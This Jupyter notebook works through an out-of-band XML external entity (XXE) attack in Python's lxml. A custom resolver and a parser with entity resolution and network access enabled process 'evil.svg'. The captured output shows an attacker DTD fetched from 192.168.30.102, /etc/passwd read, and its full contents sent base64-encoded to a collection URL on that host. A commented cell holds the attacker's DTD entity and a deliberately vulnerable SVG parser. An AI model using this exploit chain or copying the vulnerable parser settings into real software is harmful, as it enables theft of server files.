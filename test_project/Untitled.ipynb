{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 94,
   "id": "cae3d52d-5121-4358-83e2-60713f3f62db",
   "metadata": {
    "tags": []
   },
   "outputs": [],
   "source": [
    "from urllib.parse import quote\n",
    "from urllib.parse import urlparse\n",
    "from lxml import etree\n",
    "import requests\n",
    "import base64\n",
    "\n",
    "class CustomResolver(etree.Resolver):\n",
    "        \n",
    "    def resolve(self, url, public_id, context):\n",
    "        print(f'resolving: {url}')\n",
    "        if url.startswith(\"file://\"):\n",
    "            parsed_uri = urlparse(url)\n",
    "            file_path = parsed_uri.path\n",
    "            with open(file_path, \"rb\") as file:\n",
    "                encoded_string = base64.b64encode(file.read())\n",
    "            return self.resolve_string(encoded_string, context)\n",
    "        super().resolve(url, public_id, context)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 95,
   "id": "dc94e109-9f4d-4ca6-9d15-bc7397d32602",
   "metadata": {
    "tags": []
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "resolving: evil.svg\n",
      "resolving: http://192.168.30.102:9090/xxe.dtd\n",
      "resolving: file:///etc/passwd\n",
      "resolving: http://192.168.30.102:9091/?collect=cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1uZXR3b3JrOng6MTAwOjEwMjpzeXN0ZW1kIE5ldHdvcmsgTWFuYWdlbWVudCwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4Kc3lzdGVtZC1yZXNvbHZlOng6MTAxOjEwMzpzeXN0ZW1kIFJlc29sdmVyLCwsOi9ydW4vc3lzdGVtZDovdXNyL3NiaW4vbm9sb2dpbgptZXNzYWdlYnVzOng6MTAyOjEwNTo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtdGltZXN5bmM6eDoxMDM6MTA2OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb24sLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c2xvZzp4OjEwNDoxMTE6Oi9ob21lL3N5c2xvZzovdXNyL3NiaW4vbm9sb2dpbgpfYXB0Ong6MTA1OjY1NTM0Ojovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KdXVpZGQ6eDoxMDY6MTEyOjovcnVuL3V1aWRkOi91c3Ivc2Jpbi9ub2xvZ2luCnRjcGR1bXA6eDoxMDc6MTEzOjovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KbWFlZGU6eDoxMDAwOjEwMDA6LCwsOi9ob21lL21hZWRlOi91c3IvYmluL3pzaApwb3N0Z3Jlczp4OjEwODoxMTg6UG9zdGdyZVNRTCBhZG1pbmlzdHJhdG9yLCwsOi92YXIvbGliL3Bvc3RncmVzcWw6L2Jpbi9iYXNoCnJlZGlzOng6MTA5OjExOTo6L3Zhci9saWIvcmVkaXM6L3Vzci9zYmluL25vbG9naW4K\n"
     ]
    }
   ],
   "source": [
    "parser = etree.XMLParser(load_dtd=True, no_network=False, resolve_entities=True, recover=False, huge_tree=True)\n",
    "parser.resolvers.add(CustomResolver())\n",
    "tree = etree.parse(\"evil.svg\", parser)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b1535b1-20f4-4914-a211-8e46e0cb8f25",
   "metadata": {},
   "outputs": [],
   "source": [
    "# attacker dtd file\n",
    "# <!ENTITY % all \"<!ENTITY send SYSTEM 'http://192.168.30.102:9091/?collect=%file;'>\">\n",
    "# %all;\n",
    "\n",
    "# class SVGImageParser(object):\n",
    "#     def __init__(self, xml_data):\n",
    "#         self.xml_data = xml_data\n",
    "#         self.tree = None\n",
    "\n",
    "#     def parse(self):\n",
    "#         try:\n",
    "#             parser = etree.XMLParser(load_dtd=True, no_network=False)\n",
    "#             self.tree = etree.fromstring(self.xml_data, parser=parser)\n",
    "#         except etree.XMLSyntaxError as e:\n",
    "#             raise ValueError(\"Invalid XML data: {}\".format(str(e)))\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
